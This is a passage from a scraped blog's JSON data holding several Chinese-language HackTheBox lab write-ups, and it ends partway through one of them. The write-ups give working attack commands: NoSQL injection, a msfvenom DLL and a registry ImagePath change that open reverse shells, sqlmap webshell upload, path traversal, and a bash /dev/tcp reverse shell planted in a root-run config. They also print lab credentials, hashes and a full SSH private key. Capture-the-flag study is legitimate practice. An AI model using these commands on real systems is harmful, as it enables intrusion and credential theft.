证书信息是staging-order.mango.htb，可以加到hosts里 Nosql injection80登录界面其实是nosql，可以用这个 https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration 1python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep username -op login:login -m POST 得到两个用户名： 同样的方法注入出password： 12345python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep password -op login:login -m POST2 password(s) found:h3mXK8RhU~f&#123;]f5Ht9KcS3&gt;!0B#2 user flag 对应关系是： 12mango:h3mXK8RhU~f&#123;]f5Hadmin:t9KcS3&gt;!0B#2 admin不能直接SSH登录，可以使用mango:h3mXK8RhU~f{]f5H可以登录SSH, user.txt在admin用户目录中： 使用admin账号密码切换到admin，得到user.txt: 提权信息使用LinEnum收集信息，发现可能利用的JJS root flagJJS具有SUID，直接使用JJS执行代码，读取root.txt: https://gtfobins.github.io/gtfobins/jjs/ 12345678admin@mango:/home/admin$ jjsWarning: The jjs tool is planned to be removed from a future JDK releasejjs&gt; var BufferedReader = Java.type(\"java.io.BufferedReader\");jjs&gt; var FileReader = Java.type(\"java.io.FileReader\");jjs&gt; var br = new BufferedReader(new FileReader(\"/root/root.txt\"));jjs&gt; while ((line = br.readLine()) != null) &#123; print(line); &#125;8a8ef79a7a2fbb01ea81688424e9ab15jjs&gt; 参考资料 https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration https://github.com/rebootuser/LinEnum Hack the box - Mangohttps://mp.weixin.qq.com/s/D2VxeXN2QEW-XXAqe6qGqw Hackthebox Mango - YouTubehttps://www.youtube.com/watch?v=BbcVNgQXzDg","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Obscurity - HackTheBox","slug":"Obscurity-HackTheBox","date":"2020-04-16T07:19:24.000Z","updated":"2020-05-11T02:46:16.134Z","comments":true,"path":"2020/04/16/Obscurity-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/16/Obscurity-HackTheBox/","excerpt":"","text":"基本信息lab地址： https://www.hackthebox.eu/home/machines/profile/219 10.10.10.168 端口扫描 80端口closed，直接访问失败 8080 提示源代码在某个目录的’SuperSecureServer.py’ 中。 扫一下目录，是develop，得到源码： 代码注入注意这里直接使用了exec： 直接exec我们可控的path，那么我们就可以在path注入python代码得到reverse shell reverse shell代码注入，得到www-root权限的shell： 接下来我们需要切到robert用户： decryptrobert用户目录存在一个加密程序，out.txt是check.txt加密后的文件, 查看下代码就知道加密算法只是异或，我们就可以用这个程序解出来key： 123456python3 SuperSecureCrypt.py -i out.txt -o /tmp/key.txt -k \"$(cat check.txt)\" -dcat /tmp/key.txtalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalkey : alexandrovich 然后使用这个key解密passwordreminder.txt： 1234python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/pass.txt -k alexandrovich -dcat /tmp/pass.txtSecThruObsFTW user flag然后使用这个密码，以robert用户登录，得到user.txt: BetterSSH 条件竞争在BetterSSH中有一个python文件，会读取shadow,把password写到tmp之后进行校验，并且有一个sleep，我们可以尝试在sleep的时候去读取tmp，条件竞争 这里我们使用两个SSH session 1234while sleep 0.1; do cat /tmp/SSH/* 2&gt;/dev/null; done # session 1/usr/bin/sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py # session 2# 注意需要绝对路径 12root$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1 解出来root密码是mercedes： root flagroot不能直接SSH登录，使用su切换到root，得到root.txt： 参考链接 https://github.com/Tatik07/Hackthebox/blob/master/Obscurity-Shell.py Hackthebox Obscurity - YouTubehttps://www.youtube.com/watch?v=0qXFSkPeNuo","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Resolute - HackTheBox","slug":"Resolute-HackTheBox","date":"2020-04-15T07:15:21.000Z","updated":"2020-06-01T00:36:45.410Z","comments":true,"path":"2020/04/15/Resolute-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/15/Resolute-HackTheBox/","excerpt":"","text":"基本信息lab地址：https://www.hackthebox.eu/home/machines/profile/220 10.10.10.169 端口扫描 是一个Windows服务器，没有web enum4linux 使用enum4linux收集信息： 这里能够看到一条信息，其中是一个账号密码： 1index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak Desc: Account created. Password set to Welcome123! 但直接使用这个账号密码尝试登录，失败： 这里可以整理出得到的所有用户名： 123456789101112131415161718192021222324252627user:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[DefaultAccount] rid:[0x1f7]user:[ryan] rid:[0x451]user:[marko] rid:[0x457]user:[sunita] rid:[0x19c9]user:[abigail] rid:[0x19ca]user:[marcus] rid:[0x19cb]user:[sally] rid:[0x19cc]user:[fred] rid:[0x19cd]user:[angela] rid:[0x19ce]user:[felicia] rid:[0x19cf]user:[gustavo] rid:[0x19d0]user:[ulf] rid:[0x19d1]user:[stevie] rid:[0x19d2]user:[claire] rid:[0x19d3]user:[paulo] rid:[0x19d4]user:[steve] rid:[0x19d5]user:[annette] rid:[0x19d6]user:[annika] rid:[0x19d7]user:[per] rid:[0x19d8]user:[claude] rid:[0x19d9]user:[melanie] rid:[0x2775]user:[zach] rid:[0x2776]user:[simon] rid:[0x2777]user:[naoki] rid:[0x2778] smb_login使用得到的用户名字典和前面的密码尝试登录，得到一个正确的账号： 1melanie:Welcome123! user flag使用这个账号密码登录，得到user.txt: 搜集信息1dir -force &#x3D; ls -a 在这个文件中发现了另一个账号的密码： 1cmd &#x2F;c net use X: \\\\fs01\\backups ryan Serv3r4Admin4cc123! note.txt使用ryan账号登录，在桌面发现一个note.txt: 任何系统更改都会在1分钟内恢复，除了管理员账号做的更改 使用whoami /all查看信息的话，能够发现ryan这个账号在DnsAdmins中： DNSAdmins to Domain Admins 搜索能够得到： Windows Privilege Escalation: DNSAdmins to Domain Admins - Server Level DLL Injectionhttps://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/ 基本就这个流程，参数自己改下 123456789Attack：msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.160 LPORT=4444 --platform=windows -f dll &gt; ~/Downloads/plugin.dllpython smbserver.py -smb2support SHARE ~/Downloads/nc -nvlp 4444Target：dnscmd.exe /config /serverlevelplugindll \\\\10.10.14.160\\SHARE\\plugin.dllsc.exe stop dnssc.exe start dns root flag得到system权限，在Administrator用户桌面得到root.txt: 参考资料 https://github.com/portcullislabs/enum4linux Windows Privilege Escalation: DNSAdmins to Domain Admins - Server Level DLL Injectionhttps://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/ Hackthebox Resolute - YouTubehttps://www.youtube.com/watch?v=WydBNOR51_o&amp;t=1s","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Remote - HackTheBox","slug":"Remote-HackTheBox","date":"2020-04-14T08:06:57.000Z","updated":"2020-09-07T00:36:42.516Z","comments":true,"path":"2020/04/14/Remote-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/14/Remote-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/234 10.10.10.180 端口扫描：一些常规端口： 80一个普通的企业网站，concat这里点进去，需要登录 20492049端口，这个是NFS的默认端口,可以直接使用showmount查看： 我们可以把这个共享目录挂载到本地： 在这个文件可以发现敏感信息： 1adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;&quot;hashAlgorithm&quot;:&quot;SHA1&quot;&#125;admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50 这个可以解出来一个密码baconandcheese 使用这个账号密码可以登录到前面80那个系统 Umbraco RCE登录进去可以看到版本信息： 1Umbraco version 7.12.4 assembly: 1.0.6879.21982 这个版本有一个已知的RCE漏洞，需要认证，我们已经有账号密码，那就可以使用这个： https://github.com/noraj/Umbraco-RCE reverse shell直接用msf生成命令得到reverse shell： user flag在public用户目录得到user.txt: WinPEAShttps://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe 用到这个文件，传上去执行, 结果里发现TV： 12TeamViewer7(TeamViewer GmbH - TeamViewer 7)[&quot;C:\\Program Files (x86)\\TeamViewer\\Version7\\TeamViewer_Service.exe&quot;] - Auto - Running TeamViewer Remote Software TV exploitTeamViewer7，很老的版本，搜索发现： Używasz aplikacji TeamViewer prywatnie lub w firmie? Uważaj, bo możesz zostać zhakowany! - Kapitan Hackhttps://kapitanhack.pl/2020/02/05/nieskategoryzowane/uzywasz-aplikacji-teamviewer-prywatnie-lub-w-firmie-uwazaj-bo-mozesz-zostac-zhakowany/ 直接运行得到TV密码： WinRM &amp; root flag这个同样存在5985端口，和之前的方法一样，端口转发，evil-winrm, 得到Administrator权限: 参考资料 https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe https://github.com/noraj/Umbraco-RCE Używasz aplikacji TeamViewer prywatnie lub w firmie? Uważaj, bo możesz zostać zhakowany! - Kapitan Hackhttps://kapitanhack.pl/2020/02/05/nieskategoryzowane/uzywasz-aplikacji-teamviewer-prywatnie-lub-w-firmie-uwazaj-bo-mozesz-zostac-zhakowany/ Hackthebox Remote - YouTubehttps://www.youtube.com/watch?v=1Cm4SJf1ZwA","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Traceback - HackTheBox","slug":"Traceback-HackTheBox","date":"2020-04-13T06:26:00.000Z","updated":"2020-08-17T02:17:49.788Z","comments":true,"path":"2020/04/13/Traceback-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/13/Traceback-HackTheBox/","excerpt":"","text":"基本信息lab地址：https://www.hackthebox.eu/home/machines/profile/233 10.10.10.181 端口扫描三个端口 80打开是一个黑页，注释中有信息： 根据信息找到这个： https://github.com/TheBinitGhimire/Web-Shells 利用这些文件名作为字典，可以找到已有的webshell： webshell默认账号密码进去，得到webshell： SSH当前用户是webadmin，在其ssh目录发现存在authorized_keys文件，我们可以把自己创建一个authorized_keys文件，里面是SSH公钥，然后上传上去替换： 然后就可以使用webadmin用户SSH登录： sysadmin根据history和已有文件，我们可以切到sysadmin用户： user flag得到user.txt: 可以自己修改下内容，这种写法得到友好的交互shell： 提权信息同样，传个pspy64上去，搜集信息，发现有一个定时备份以root权限运行： root flag注意复制后目录中的文件，00-header看起来是ssh登录后显示的内容，我们可以写入命令，然后重新登录： 参考资料 Hackthebox Traceback - YouTubehttps://www.youtube.com/watch?v=r8Pbimic9xQ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Book - HackTheBox","slug":"Book-HackTheBox","date":"2020-04-09T07:24:47.000Z","updated":"2020-07-13T00:48:32.423Z","comments":true,"path":"2020/04/09/Book-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/09/Book-HackTheBox/","excerpt":"","text":"基本信息lab地址：https://www.hackthebox.eu/home/machines/profile/230 https://www.hackthebox.eu/home/machines/profile/230 端口扫描 只有80和22端口 80 注册和登录，因为没有账号，就先随便注册一个, 登录进去后发现管理员邮箱： 管理员账号尝试弱口令无效，扫目录能够发现admin登录入口，没有账号密码。 sql截断前端有校验邮箱长度，如果对注册进行fuzz，过长的email注册成功但是没法登陆，数据可能截断了，考虑尝试sql截断攻击。 这样注册一个新账号，截断导致可以直接使用admin@book.htb进行登录 PDF XSS LFI用户界面可以提交文件，管理界面导出pdf，里面链接是用户上传的文件被转换为pdf： 另外参数可以XSS，导出pdf是解析后的内容，那么可以考虑pdf xss读文件，尝试读取/etc/passwd文件，发现一个reader用户： user ssh key读取SSH私钥，SSH登录： 直接复制粘贴的话格式问题比较坑，可以用这个直接转： https://github.com/pdfminer/pdfminer.six user flag登录进去得到user flag： 搜集提权所需信息lse/linpeas/pspy之类的都可以，这里用的pspy https://github.com/DominicBreuker/pspy 能够发现循环执行： 1CMD: UID&#x3D;0 PID&#x3D;46156 | &#x2F;usr&#x2F;sbin&#x2F;logrotate -f &#x2F;root&#x2F;log.cfg logrotate exploitgoogle能搜到对应的利用工具： https://github.com/whotwagner/logrotten 基本就是日志变动会触发，然后执行我们那边的payload，但反弹shell很容易断，我们可以直接把root用户的ssh密钥复制到其他目录： root flag然后使用root用户登录，得到root flag： 参考资料 SQL截断攻击 | Err0rhttps://err0rzz.github.io/2018/02/01/SQL%E6%88%AA%E6%96%AD%E6%94%BB%E5%87%BB/ Local File Read via XSS in Dynamically Generated PDFhttps://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html Hackthebox Book - YouTubehttps://www.youtube.com/watch?v=VvBJ4XW0spQ https://github.com/whotwagner/logrotten https://github.com/DominicBreuker/pspy","categories":[],"tags":[]},{"title":"Control - HackTheBox","slug":"Control-HackTheBox","date":"2020-04-09T02:46:41.000Z","updated":"2020-04-26T00:53:38.930Z","comments":true,"path":"2020/04/09/Control-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/09/Control-HackTheBox/","excerpt":"","text":"基本信息lab地址：https://www.hackthebox.eu/home/machines/profile/218 10.10.10.167 端口扫描三个端口： 80 扫描目录发现存在一个admin.php,直接访问被拒绝： 提示缺失Header，需要通过代理访问，代理header那应该是XFF之类的，在首页源码能看到注释中的信息： 那么可以尝试用这个IP作为XFF头，直接burp加一条规则： SQL注入是一个简单的CRUD，很容易就发现存在注入： 不是DBA，直接os-shell能写入UDF，但没有回显： getshell那么可以尝试写webshell，因为是IIS，sql-shell测试写到IIS默认目录可以写入成功： 1select \"&lt;?php phpinfo(); ?&gt;\" into outfile \"C:/inetpub/wwwroot/info.php\": 'NULL' Sql-shell里写太麻烦，直接这样写webshell 1sqlmap -r sql.txt --file-write=shell.php --file-dest=C:/inetpub/wwwroot/shell.php --batch 然后为了方便可以直接上meterpreter： 1234567use exploit&#x2F;multi&#x2F;script&#x2F;web_deliveryset target PHPset payload php&#x2F;meterpreter&#x2F;reverse_tcpset lhost 10.10.14.103set srvhost 10.10.14.103set lport 7777run 账号信息可以在database.php里发现一个账号密码： 另外也可以直接通过注入获取mysql账号密码： 123hector | *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D (l33th4x0rhector)|| manager | *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA (l3tm3!n) || root | *0A4A5CAD344718DC418035A1F4D292BA603134D8 root的解不出来 WinRM我们现在的shell是wwwroot用户，那么接下来应该就是要想办法切换到其他用户 netstat可以看到一个5985端口，这是WinRM 的默认端口，WinRM是Windows 系统的远程管理服务 进行端口转发，使用已经得到的账号密码尝试，能够知道hector的账号密码是正确的，但命令执行报错： 1portfwd add -l 5985 -p 5985 -r 10.10.10.167 可以换evil-winrm进行操作： https://github.com/Hackplayers/evil-winrm 这里因为安装问题，换到虚拟机了，使用hector账号密码，在桌面得到user flag 敏感文件在这个目录发现一个历史记录文件： 123*Evil-WinRM* PS C:\\Users\\Hector\\APpdata\\roaming\\microsoft\\windows\\powershell\\PSreadline&gt; type ConsoleHost_history.txtget-childitem HKLM:\\SYSTEM\\CurrentControlset | format-listget-acl HKLM:\\SYSTEM\\CurrentControlSet | format-list 提权这里可利用的是wuauserv，这个服务是Windows update的一个系统服务，系统权限。 修改这个服务的imagepath，反弹shell，为了方便还是通过hector的shell加载个meterpreter，上传nc，然后 1234reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlset\\Services\\wuauservreg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlset\\Services\\wuauserv&quot; &#x2F;t REG_EXPAND_SZ &#x2F;v ImagePath &#x2F;d &quot;C:\\Users\\Hector\\Documents\\nc64.exe -e cmd.exe 10.10.15.181 7777&quot; &#x2F;fThe operation completed successfully.start-service wuauserv root flag执行后得到system权限的reverse shell： 参考资料 Hackthebox——Controlhttps://mp.weixin.qq.com/s/8OugAknFrfKs5ujG4WKf1w powershell反弹shell常见方式 - 安全客，安全资讯平台https://www.anquanke.com/post/id/99793 Windows提权笔记 - 先知社区https://xz.aliyun.com/t/2519","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"LaCasaDePapel - HackTheBox","slug":"LaCasaDePapel-HackTheBox","date":"2020-03-17T07:39:10.000Z","updated":"2021-08-03T07:41:54.205Z","comments":true,"path":"2020/03/17/LaCasaDePapel-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/03/17/LaCasaDePapel-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/181 10.10.10.131 端口扫描21,22,80,443: 1234567891011121314151617181920212223242526272829303132$ nmap -sC -sV 10.10.10.131Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-03 14:15 CSTNmap scan report for 10.10.10.131Host is up (0.068s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.3.422/tcp open ssh OpenSSH 7.9 (protocol 2.0)| ssh-hostkey:| 2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)| 256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)|_ 256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)80/tcp open http Node.js (Express middleware)|_http-title: La Casa De Papel443/tcp open ssl/http Node.js Express framework| http-auth:| HTTP/1.1 401 Unauthorized\\x0D|_ Server returned status 401 but no WWW-Authenticate header.| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel| Not valid before: 2019-01-27T08:35:30|_Not valid after: 2029-01-24T08:35:30|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http/1.1| tls-nextprotoneg:| http/1.1|_ http/1.0Service Info: OS: UnixService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 64.10 seconds 80 443443提示需要客户端证书： vsftpdvsftpd 2.3.4,可以搜到个后门： vsftpd 2.3.4 - Backdoor Command Execution - Unix remote Exploithttps://www.exploit-db.com/exploits/49757 psy直接利用可以得到psy shell： 可以执行一些php函数，根据phpinfo()可以知道禁用了常见的执行命令函数，scandir之类的可以查看目录 ca.keynairobi用户目录得到一个ca证书： tokyo查看变量发现用户证书是根据ca.key生成的： Private Area用户证书使用ca.key生成用户证书 1234openssl s_client -connect 10.10.10.131:443openssl req -x509 -new -nodes -key ca.key -sha256 -days 1024 -out miao.pemopenssl pkcs12 -export -in miao.pem -inkey ca.key -out miao.p12 之后浏览器导入p12证书，刷新443，确认后进入PRIVATE AREA： 路径遍历任意选择一个进去，可以下载avi，注意到文件名只是base64编码： 1234https://10.10.10.131/file/U0VBU09OLTEvMDEuYXZpecho U0VBU09OLTEvMDEuYXZp | base64 -dSEASON-1/01.avi user flag路径遍历查看到文件，文件名编码,得到user.txt： 123456https://10.10.10.131/?path=..$ echo -n \"../user.txt\" | base64Li4vdXNlci50eHQ=https://10.10.10.131/file/Li4vdXNlci50eHQ= ssh私钥及用户名同样的方式，读取ssh私钥已经/etc/passw提取用户名： 12curl -k https://10.10.10.131/file/$(echo -n \"../.ssh/id_rsa\" | base64)curl -k https://10.10.10.131/file/$(echo -n \"../../../../../etc/passwd\" | base64) id_rsa12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcnNhAAAAAwEAAQAAAgEAotH6Ygupi7JhjdbDXhg2f9xmzxaDNdxxEioAgH2GjUeUc4cJeTfU&#x2F;yWg1vyx1dXqanfwAzYOQLUgO9&#x2F;rDbI9y51rTQnLhHsp&#x2F;iFiGdvDO5iZwLNrwmzVLxgGc+mNac3qxHcuHx7q+zQHB8NfU&#x2F;qzyAL2&#x2F;xsRkzBODRg21tsVqnTV83T8CFSBUO2jzitHFNjvYbacP+Jn9Q5Y2HRdE03DWnAJJ7zk4SWWicM3riuuYyeqV6OYKboHwi+FB94Yx1xaPFGP7T0jnBU3molURhKKolNqY78PE5qYplO&#x2F;eO5H&#x2F;7vKbrF7J5VtsVpvGQsmjqUhQK&#x2F;GoYrMudIhcfQSMUnpgWXYtCnIpBa53aY&#x2F;fl0XYpL9a1ZQh1iGm4oleVnZNvqMa4mb+8kC8k3WDmw9pq&#x2F;W3eGVQ6Xeyj&#x2F;4kUENe1Q8xj9BIXLZJwXYHtACLS4PaKZSRaFSjkc&#x2F;26&#x2F;T2958f2oBqJLf+oxiydgcTI2vC34OYwwS7cOcSsS4HivUC6K7oJJHw3nUNoA2ge3cwiO6bNHrEKMJWOrMpp9UH9BbQ&#x2F;u7k5Ap7QF8yBfrdC64EAUzyZJXWde1NhSNjiI0rBqzCPZQGSOLEIFAwzU0bMIuJu4JIQOAH+3tfoh8ccUdNcmfH7LaT7pF3VYwyoPMowLpA8fG4FXGyvoyrfeTXC6GY0+1NVUAAAdQRqG3BkahtwYAAAAHc3NoLXJzYQAAAgEAotH6Ygupi7JhjdbDXhg2f9xmzxaDNdxxEioAgH2GjUeUc4cJeTfU&#x2F;yWg1vyx1dXqanfwAzYOQLUgO9&#x2F;rDbI9y51rTQnLhHsp&#x2F;iFiGdvDO5iZwLNrwmzVLxgGc+mNac3qxHcuHx7q+zQHB8NfU&#x2F;qzyAL2&#x2F;xsRkzBODRg21tsVqnTV83T8CFSBUO2jzitHFNjvYbacP+Jn9Q5Y2HRdE03DWnAJJ7zk4SWWicM3riuuYyeqV6OYKboHwi+FB94Yx1xaPFGP7T0jnBU3molURhKKolNqY78PE5qYplO&#x2F;eO5H&#x2F;7vKbrF7J5VtsVpvGQsmjqUhQK&#x2F;GoYrMudIhcfQSMUnpgWXYtCnIpBa53aY&#x2F;fl0XYpL9a1ZQh1iGm4oleVnZNvqMa4mb+8kC8k3WDmw9pq&#x2F;W3eGVQ6Xeyj&#x2F;4kUENe1Q8xj9BIXLZJwXYHtACLS4PaKZSRaFSjkc&#x2F;26&#x2F;T2958f2oBqJLf+oxiydgcTI2vC34OYwwS7cOcSsS4HivUC6K7oJJHw3nUNoA2ge3cwiO6bNHrEKMJWOrMpp9UH9BbQ&#x2F;u7k5Ap7QF8yBfrdC64EAUzyZJXWde1NhSNjiI0rBqzCPZQGSOLEIFAwzU0bMIuJu4JIQOAH+3tfoh8ccUdNcmfH7LaT7pF3VYwyoPMowLpA8fG4FXGyvoyrfeTXC6GY0+1NVUAAAADAQABAAACAAx3e25qai7yF5oeqZLY08NygsS0epNzL40ufh9YfSbwJiO6YTVQ2xQ2M1yCuLMgz&#x2F;Qa&#x2F;tugFfNKaw9qk7rWvPiMMx0Q9O5N5+c3cyV7uDUl+A&#x2F;TLRsT7jbO5h+V8Gf7hlBIt9VWLrPRRgCIKxJpDb7wyyy5S90zQ6apBfnpiH0muQMNIAcbQVOK&#x2F;pHYqnakLaATtV8G3OLcmFzqe&#x2F;3wZFbWYT0Tr4q1sBMYSXkiixW4gch4FDyNq+5oaQ0zKj6Jibc4n4aQudtHnJxOi49Z+Bd5v5mnlWXw3mNN4klGJWklXdif6kgbnuyHeh42xlsBtcwYKWNRF1&#x2F;bAQiSoZn4iNJqSFYcx9SzE+QadUfhtkbBiBC7HPHhANgmcg4FBJsz3fS4vJWkQvRd&#x2F;wGjW+B6ywn6qrsJ1hSaoR9Tr7pwKfTKL1HyvMCWd5DEt98EWyyQUdHfKYgpE4oo6g2LX9c6bLawGvzFkVcfiH8XM0lyRpKV2hAU03KzNbbmy73HsxMBbVp0SMk62phRWwt8dQedPW8J71LR0igh8ckkuP13ZWPUUdTJJDc4UZycDzNruCj&#x2F;8kPYn4Lo4s8E1XJ3y&#x2F;F8GQn2NvjjhkOgS+fMnQwfxPl3yDg4g&#x2F;QgxOQ5b3yZwPVUM75IjperwQYXjzfY1XO5WtyGc75iUJMuSvXWukWAKJtBAAABAA+0Nxztrd02xlT+o9FRgUJ2CCed11eqAX2Lo2tpJB8G7e889OCz3YqRDAQSm4&#x2F;1okhKPUj3B&#x2F;bcZqOyRFbABZTJYOg0&#x2F;m0Ag6Fb26S3TBMMrAgrSnxksZ36KlW1WpuwrKq+4jSFJV5cPjpk9jVQmhvdgxHlSjIEpOkByOH4aKK7wuaIA5jqPKrq74cDmukNhpV4xjan1Rj7zPFLnoce0QMWdX4CShUa+BNInls8&#x2F;v7MflLgxQ53I21cHXTdNf5zrc48jlAJQuRiTSgIYSu+G1IIoLibVA&#x2F;GPWOOJ2jmV0cpNzfbmGM&#x2F;A2AEGvSKtuP9DwA1NHfnDDUIZds61tF9CxUAAAEBANVkFLByFDv9qnHymc&#x2F;tr6dtqyyMY6D7YeU3ZWL+dNPSlSW&#x2F;bNYjlA9S4aB2yuN+tAMeU0E6jKgh1+ROlNwXu48uN&#x2F;QL50gZpiLcSlqZnhFQ&#x2F;2El2Uvj2Y&#x2F;SPnklDVQnQ&#x2F;5yZBQR0bBiy&#x2F;EJIOfJQo0KRbR&#x2F;pq51eUhzBSEBMz6nBIY8zPdOVfhngZUpMe4S7N1RPDWS2OvGwwWkwmmiJe45cGD7SKLj0Jv+p&#x2F;DZ+k9ZiI5tEGY87DKAh0wrV04u4I&#x2F;lxGl6TCoXDr7hi1dAdVWW84cj8mFW7q9UN0y15Vn82HPIq5ZaSKfM6qPKfYeBBaN8hUIogf+FlwHjzSWOPb0AAAEBAMNU3uGeUUMVn1dUOMeemr+LJVHHjtqbL3oq97+fd1ZQ6vchTyKX6cbCC7gB13qJ6oWO1GhB9e4SAd3DYiNv&#x2F;LO9z1886DyqNLVHKYXn0SNSLTPb7n9NjwJNz1GuPqW43pGwlBhMPZhJPA+4wmiO9GV+GXlaFrz16Or&#x2F;qCexGyovMIhKtV0Ks3XzHhhjG41egKd&#x2F;wGl3vV74pTWIyS2Nrtilb7ii8jd2MezuSTf7SmjiE0GPY8xt0ZqVq+&#x2F;Fj&#x2F;vfM+vbN1ram9k+oABmLisVVgkKvfbzWRmGMDfG2X0jOrIw52TZn9MwTcr+oMyi1RTG7oabPl6cNM0xX3a0iF5JE3kAAAAYYmVybGluQGxhY2FzYWRlcGFwZWwuaHRiAQID-----END OPENSSH PRIVATE KEY----- professor &amp; 提权信息得到的私钥可以登录professor用户： 提权信息root会定时读取memcached.ini，执行里面命令，我们不能直接修改这个文件，但对目录有些权限，可以删除文件后创建新的： 提权 &amp; root flag删除创建文件，等待触发，读取root.txt: 123rm memcached.ini echo -e \"[program:memcached]\\ncommand = bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1'\" &gt; memcached.ini 参考资料 vsftpd 2.3.4 - Backdoor Command Execution - Unix remote Exploithttps://www.exploit-db.com/exploits/49757 HTB: LaCasaDePapel | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/07/27/htb-lacasadepapel.html https://www.hackthebox.eu/home/machines/writeup/181 HackTheBox - LaCasaDePapel - YouTubehttps://www.youtube.com/watch?v=OSRCEOQQJ4E&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Writeup - HackTheBox","slug":"Writeup-HackTheBox","date":"2020-03-15T07:42:41.000Z","updated":"2021-07-12T07:43:55.923Z","comments":true,"path":"2020/03/15/Writeup-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/03/15/Writeup-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/192 10.10.10.138 端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV 10.10.10.138Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-12 14:53 CSTNmap scan report for 10.10.10.138Host is up (0.070s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey:| 2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)| 256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)|_ 256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)80/tcp open tcpwrappedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 71.37 seconds 80根据页面信息提示，禁止自动化扫描，因为会大量400: Robots.txt给出writeup： writeup是CMS Made Simple CMS Made Simple搜到相关漏洞： CMS Made Simple &lt; 2.2.10 - SQL Injection - PHP webapps Exploithttps://www.exploit-db.com/exploits/46635 sql注入sql注入及hash破解，得到jkr账号密码： 1234567891011python sql.py -u http:&#x2F;&#x2F;10.10.10.138&#x2F;writeup&#x2F;[+] Salt for password found: 5a599ef57905[+] Username found: jkr[+] Email found: jkr@writeup.htb[+] Password found: 62def4866937f08cc13bab43bb14e6f762def4866937f08cc13bab43bb14e6f7:5a599ef579066807sudo hashcat -a 0 -m 20 hash.txt 